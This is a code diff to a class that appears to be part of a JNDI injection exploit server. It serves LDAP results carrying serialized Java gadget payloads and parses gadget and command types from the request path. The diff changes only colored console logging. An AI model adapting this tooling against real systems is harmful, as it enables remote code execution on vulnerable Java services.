@@ -13,6 +13,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.commons.cli.CommandLine;
+import org.fusesource.jansi.Ansi;
 
 import java.io.ByteArrayOutputStream;
 import java.util.Base64;
@@ -31,8 +32,6 @@ public class SerializedDataController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println(ansi().render("@|green [+] Send LDAP result for|@" + base + " @|green with javaSerializedData attribute|@"));
-        System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
         Entry e = new Entry(base);
 
         byte[] bytes;
@@ -61,13 +60,14 @@ public class SerializedDataController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
+        System.out.println("- JNDI Deserialization Links ");
         try {
             base = base.replace('\\', '/');
             int firstIndex  = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try {
                 gadgetType = base.substring(firstIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+] GaddgetType : |@" + gadgetType));
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Gaddget: " + gadgetType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
@@ -87,7 +87,7 @@ public class SerializedDataController implements LdapController {
 
             if (payloadType == PayloadType.sethttp) {
                 params = BCEL1;
-                System.out.println(ansi().render("@|green [+] command：|@" + BCEL1));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + BCEL1).reset());
             }
 
             if (payloadType == PayloadType.command) {
@@ -105,7 +105,7 @@ public class SerializedDataController implements LdapController {
                 }
 
                 params = cmd11;
-                System.out.println(ansi().render("@|green [+] command：|@" + cmd11));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd11).reset());
             }
 
         } catch (Exception e) {
